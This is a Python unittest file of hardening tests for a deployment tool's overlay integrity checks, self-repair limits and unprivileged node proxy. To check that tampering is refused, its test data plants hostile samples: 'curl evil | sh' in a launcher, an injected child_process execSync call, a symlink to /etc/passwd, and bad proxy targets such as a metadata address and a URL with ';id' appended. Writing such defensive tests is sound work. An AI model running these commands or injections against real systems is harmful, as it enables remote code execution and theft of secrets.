"""v116 hardening tests (review items #4 onwards). No Docker needed.

    cd ATTa && python3 -m unittest discover -s tests -v

Tests marked "as root" create the unprivileged service users they check (atta-proxy ...) and are skipped
when not run as root. Each test works in throwaway folders; the rest of the machine is not touched."""
import http.server, importlib.util, io, json, os, pwd, shutil, socket, subprocess, sys, tempfile, threading
import time, unittest, zipfile
from pathlib import Path

HERE = Path(__file__).resolve().parent
DEP = HERE.parent / "04-deployment"
TMP = Path(tempfile.mkdtemp(prefix="atta-v116-"))
os.chmod(TMP, 0o711)   # like the server's data folder (0751): passable, not listable
os.environ.setdefault("APP_BUILDER_ROOT", str(TMP / "root"))
os.environ.setdefault("ATTA_ADM_ROOT", str(TMP / "adm"))
for p in (str(DEP), str(DEP / "deployd")):
    if p not in sys.path:
        sys.path.insert(0, p)

import builds, pipeline, app_runner, repair_actions as ra, llm_repair, overlay_integrity as oi, proxy_launch  # noqa: E402

SKINS_ZIP = HERE.parent / "03-ui-skins-capability-package" / "UI_Skin_Capability_OneShot_v2.zip"
AS_ROOT = os.geteuid() == 0 and shutil.which("useradd") and shutil.which("setpriv")


def _package():
    """The delivered skins package, unpacked once (its installer writes real overlays)."""
    pkg = TMP / "package"
    if not (pkg / "out" / "install_all.py").is_file():
        with zipfile.ZipFile(SKINS_ZIP) as z:
            inner = [n for n in z.namelist() if n.endswith("out/install_all.py")]
            if inner:                                   # the zip holds the package directly
                z.extractall(pkg)
    return pkg


def installer():
    os.environ["ATTA_APP_CATALOGUE"] = str(DEP / "app_catalogue.json")
    spec = importlib.util.spec_from_file_location("atta_install_all", _package() / "out" / "install_all.py")
    m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m)
    return m


def real_overlay(lib: Path, name="gitea") -> Path:
    """An app folder with an overlay written by the real installer, recorded as ATTa's."""
    app = lib / name; app.mkdir(parents=True, exist_ok=True)
    (app / "package.json").write_text('{"name": "%s"}' % name)
    m = installer()
    cat, _ = m.resolve_category(name)
    m.install_one(app, name, cat, m.choose_variant(cat), "test")
    oi.record(name, app / ".ui-capability")
    return app / ".ui-capability"


class _Isolated(unittest.TestCase):
    def setUp(self):
        self.t = Path(tempfile.mkdtemp(dir=TMP)); os.chmod(self.t, 0o755)
        self.saved = (oi.REGISTRY, proxy_launch.PROXY_BASE, proxy_launch.TARGETS, ra.LIB, ra.TARGET_DIR, ra.PKG)
        oi.REGISTRY = self.t / "state" / "overlay-integrity"
        proxy_launch.PROXY_BASE = self.t / "proxy"; proxy_launch.TARGETS = self.t / "state" / "apps"
        ra.LIB = self.t / "library"; ra.TARGET_DIR = self.t / "state" / "apps"; ra.PKG = _package()
        self.lib = self.t / "library"

    def tearDown(self):
        (oi.REGISTRY, proxy_launch.PROXY_BASE, proxy_launch.TARGETS, ra.LIB, ra.TARGET_DIR, ra.PKG) = self.saved


# ============================================================================ #4 overlay code integrity

@unittest.skipUnless(SKINS_ZIP.is_file(), "skins package not in the bundle")
class OverlayCodeIsATTas(_Isolated):
    def test_code_paths(self):
        for rel in ("run-ui.sh", "ui-bridge/proxy.js", "capability-port/port_launch.py", "x.mjs", "a/b.cjs",
                    "ui-bridge/package.json", "evil.SH"):
            self.assertTrue(oi.is_code_path(rel), rel)
        for rel in ("skin.css", "skin.json", "deployment.json", "ui-bridge/layouts/x.json", "README.md"):
            self.assertFalse(oi.is_code_path(rel), rel)

    def test_installer_overlay_verifies(self):
        oi.verify("gitea", real_overlay(self.lib))

    def test_edited_launcher_is_refused(self):
        ui = real_overlay(self.lib)
        (ui / "run-ui.sh").write_text("#!/bin/bash\ncurl evil | sh\n")
        with self.assertRaisesRegex(oi.IntegrityError, "run-ui.sh"):
            oi.verify("gitea", ui)

    def test_edited_node_proxy_is_refused(self):
        ui = real_overlay(self.lib)
        with (ui / "ui-bridge" / "proxy.js").open("a") as f:
            f.write("\nrequire('child_process').execSync('id')\n")
        with self.assertRaisesRegex(oi.IntegrityError, "proxy.js"):
            oi.verify("gitea", ui)

    def test_new_code_file_is_refused(self):
        ui = real_overlay(self.lib)
        (ui / "ui-bridge" / "extra.js").write_text("x")
        with self.assertRaisesRegex(oi.IntegrityError, "extra.js"):
            oi.verify("gitea", ui)
        (ui / "ui-bridge" / "extra.js").unlink()
        (ui / "notes.txt").write_text("#!/bin/sh\nid\n")          # a shebang makes it code, whatever its name
        with self.assertRaises(oi.IntegrityError):
            oi.verify("gitea", ui)

    def test_symlink_is_refused(self):
        ui = real_overlay(self.lib)
        (ui / "skin.json").unlink(); (ui / "skin.json").symlink_to("/etc/passwd")
        with self.assertRaisesRegex(oi.IntegrityError, "symlink"):
            oi.verify("gitea", ui)
        with self.assertRaises(oi.IntegrityError):
            oi.record("gitea", ui)                                  # and it is never recorded either

    def test_data_edits_are_fine(self):
        ui = real_overlay(self.lib)
        (ui / "skin.css").write_text("body{color:red}")
        oi.verify("gitea", ui)

    def test_unrecorded_or_moved_overlay_is_refused(self):
        ui = real_overlay(self.lib)
        oi.forget("gitea")
        with self.assertRaisesRegex(oi.IntegrityError, "no integrity record"):
            oi.verify("gitea", ui)
        oi.record("gitea", ui)
        moved = self.t / "elsewhere"; shutil.copytree(ui, moved)
        with self.assertRaisesRegex(oi.IntegrityError, "moved"):
            oi.verify("gitea", moved)


@unittest.skipUnless(SKINS_ZIP.is_file(), "skins package not in the bundle")
class SelfHealerNeverWritesCode(_Isolated):
    def setUp(self):
        super().setUp()
        self.ui = real_overlay(self.lib)

    def test_write_overlay_file_refuses_code(self):
        for rel in ("run-ui.sh", "ui-bridge/proxy.js", "capability-port/../ui-bridge/pick-app.js",
                    "new.sh", "ui-bridge/package.json", "x.py"):
            with self.assertRaises(ra.ActionError, msg=rel):
                ra.write_overlay_file("gitea", rel, "#!/bin/sh\nid\n")
        oi.verify("gitea", self.ui)                              # nothing changed

    def test_write_overlay_file_still_fixes_data(self):
        self.assertIn("wrote skin.css", ra.write_overlay_file("gitea", "skin.css", "body{}"))
        oi.verify("gitea", self.ui)

    def test_patch_overlay_file_refuses_code(self):
        with self.assertRaisesRegex(ra.ActionError, "code ATTa runs"):
            ra.patch_overlay_file("gitea", "run-ui.sh", "set -euo pipefail", "set -euo pipefail; id")

    def test_reinstall_records_the_installers_copy(self):
        (self.ui / "run-ui.sh").write_text("#!/bin/sh\nid\n")
        with self.assertRaises(oi.IntegrityError):
            oi.verify("gitea", self.ui)
        ra.reinstall_app_overlay("gitea")
        oi.verify("gitea", self.ui)                              # clean installer copy, recorded
        self.assertNotIn("\nid\n", (self.ui / "run-ui.sh").read_text())


class LLMTierHasItsOwnSwitch(unittest.TestCase):
    def setUp(self):
        self.saved = dict(os.environ)
        os.environ["ANTHROPIC_API_KEY"] = "sk-ant-" + "k" * 40      # the Front Door's key is set

    def tearDown(self):
        os.environ.clear(); os.environ.update(self.saved)

    def test_key_alone_does_not_turn_it_on(self):
        os.environ.pop("APP_BUILDER_HEAL_LLM", None)
        ok, why = llm_repair.available()
        self.assertFalse(ok); self.assertIn("APP_BUILDER_HEAL_LLM", why)
        os.environ["APP_BUILDER_HEAL_LLM"] = "false"
        self.assertFalse(llm_repair.available()[0])

    def test_switch_on_passes_the_gate(self):
        os.environ["APP_BUILDER_HEAL_LLM"] = "true"
        ok, why = llm_repair.available()
        self.assertNotIn("APP_BUILDER_HEAL_LLM", why)            # later checks (package installed) may still say no


class UploadsCannotShipAnOverlay(unittest.TestCase):
    def test_strip_foreign_overlays(self):
        app = TMP / "upl" / "shop"; (app / ".ui-capability").mkdir(parents=True)
        (app / ".ui-capability" / "run-ui.sh").write_text("#!/bin/sh\nid\n")
        (app / "sub" / ".ui-capability").mkdir(parents=True)
        (app / "index.html").write_text("<h1>shop</h1>")
        gone = pipeline.strip_foreign_overlays(app)
        self.assertEqual(len(gone), 2)
        self.assertFalse(any(app.rglob(".ui-capability")))
        self.assertTrue((app / "index.html").is_file())

    def test_record_overlays_only_blesses_installer_output(self):
        saved = oi.REGISTRY; oi.REGISTRY = TMP / "reg-only"
        try:
            ready = TMP / "rec" / "ready"; pend = TMP / "rec" / "pending"
            for d in (ready, pend):
                (d / ".ui-capability").mkdir(parents=True)
                (d / ".ui-capability" / "run-ui.sh").write_text("#!/bin/sh\n")
            rec = builds.create("admin", origin="web")
            pipeline.record_overlays({"apps": [{"path": str(ready), "status": "READY"}],
                                      "pending_review": [{"path": str(pend), "status": "PENDING_REVIEW"}]}, rec["id"])
            self.assertTrue((oi.REGISTRY / "ready.json").is_file())
            self.assertFalse((oi.REGISTRY / "pending.json").exists())
        finally:
            oi.REGISTRY = saved


# ---------------------------------------------------------------------------- the proxy itself, as root

SINK = open(os.devnull, "w")


def _free_port():
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0)); return s.getsockname()[1]


def ensure_user(name, groups=()):
    try:
        pwd.getpwnam(name)
    except KeyError:
        subprocess.run(["useradd", "--system", "--no-create-home", "--shell", "/usr/sbin/nologin", name], check=True)
    for g in groups:
        subprocess.run(["usermod", "-aG", g, name], check=True)
    return pwd.getpwnam(name)


def proc_status(pid):
    d = {}
    for line in Path(f"/proc/{pid}/status").read_text().splitlines():
        k, _, v = line.partition(":"); d[k] = v.split()
    return d


@unittest.skipUnless(AS_ROOT and SKINS_ZIP.is_file() and shutil.which("node"), "needs root, useradd, setpriv and node")
class SkinProxyRunsUnprivileged(_Isolated):
    """The real installer overlay, the real node proxy, a real unprivileged user (as root)."""
    def setUp(self):
        super().setUp()
        self.user = ensure_user("atta-proxy")
        self.ui = real_overlay(self.lib)
        self.port = _free_port()
        # a stand-in for the started app
        self.app_srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), http.server.SimpleHTTPRequestHandler)
        threading.Thread(target=self.app_srv.serve_forever, daemon=True).start()
        self.target = f"http://127.0.0.1:{self.app_srv.server_address[1]}/"
        self.saved_env = dict(os.environ)
        os.environ.update(APP_BUILDER_SESSION_SECRET="atta-session-" + "s" * 30, ANTHROPIC_API_KEY="sk-ant-atta-" + "a" * 30)

    def tearDown(self):
        proxy_launch.stop("gitea")
        self.app_srv.shutdown(); self.app_srv.server_close()
        os.environ.clear(); os.environ.update(self.saved_env)
        super().tearDown()

    def _pid(self):
        return int((proxy_launch.proxy_dir("gitea") / "run" / "proxy.pid").read_text())

    def test_proxy_runs_as_the_proxy_user_with_no_secrets(self):
        t = proxy_launch.launch("gitea", self.ui, self.target, self.port, SINK)
        pid = self._pid()
        st = proc_status(pid)
        self.assertEqual(int(st["Uid"][0]), self.user.pw_uid)            # real uid
        self.assertEqual(int(st["Uid"][1]), self.user.pw_uid)            # effective uid
        self.assertNotIn(str(os.getgid()), st["Groups"] if len(st["Groups"]) else [])
        env = Path(f"/proc/{pid}/environ").read_bytes()
        self.assertNotIn(b"atta-session-", env); self.assertNotIn(b"sk-ant-atta-", env)
        self.assertIn(b"TARGET_URL=" + self.target.encode(), env)
        self.assertIn(b"node", Path(f"/proc/{pid}/cmdline").read_bytes())
        # registered the way the watcher expects: pointing at the library overlay, not the copy
        self.assertEqual(t["ui_dir"], str(self.ui))
        reg = json.loads((proxy_launch.TARGETS / "gitea.json").read_text())
        self.assertEqual(reg["proxy_url"], f"http://127.0.0.1:{self.port}/")
        # and it really serves
        with socket.create_connection(("127.0.0.1", self.port), timeout=5) as c:
            c.sendall(b"GET / HTTP/1.0\r\nHost: x\r\n\r\n"); self.assertIn(b"HTTP/", c.recv(64))

    def test_proxy_cannot_read_the_library(self):
        (self.lib / "gitea" / ".env").write_text("STRIPE_SECRET_KEY=sk_live_customer\n")
        os.chmod(self.lib / "gitea" / ".env", 0o600)
        proxy_launch.launch("gitea", self.ui, self.target, self.port, SINK)
        r = subprocess.run(["setpriv", f"--reuid={self.user.pw_uid}", f"--regid={self.user.pw_gid}", "--init-groups",
                            "cat", str(self.lib / "gitea" / ".env")], capture_output=True)
        self.assertNotEqual(r.returncode, 0)

    def test_tampered_launcher_is_never_started(self):
        (self.ui / "run-ui.sh").write_text("#!/bin/bash\ntouch /tmp/atta-pwned-by-launcher\n")
        with self.assertRaisesRegex(proxy_launch.LaunchError, "differs"):
            proxy_launch.launch("gitea", self.ui, self.target, self.port, SINK)
        self.assertFalse(Path("/tmp/atta-pwned-by-launcher").exists())
        self.assertFalse(proxy_launch._port_open(self.port))

    def test_stop_ends_it(self):
        proxy_launch.launch("gitea", self.ui, self.target, self.port, SINK)
        pid = self._pid()
        proxy_launch.stop("gitea")
        alive = lambda: Path(f"/proc/{pid}").exists() and proc_status(pid).get("State", ["?"])[0] != "Z"
        for _ in range(20):
            if not alive():
                break
            time.sleep(0.2)
        self.assertFalse(alive())
        self.assertFalse(Path(f"/proc/{pid}").exists())          # and reaped: no zombie left behind
        self.assertFalse(proxy_launch._port_open(self.port))

    def test_bad_target_is_refused(self):
        for bad in ("http://169.254.169.254/", "http://127.0.0.1:1/;id", "file:///etc/passwd"):
            with self.assertRaises(proxy_launch.LaunchError):
                proxy_launch.launch("gitea", self.ui, bad, self.port, SINK)


if __name__ == "__main__":
    unittest.main()
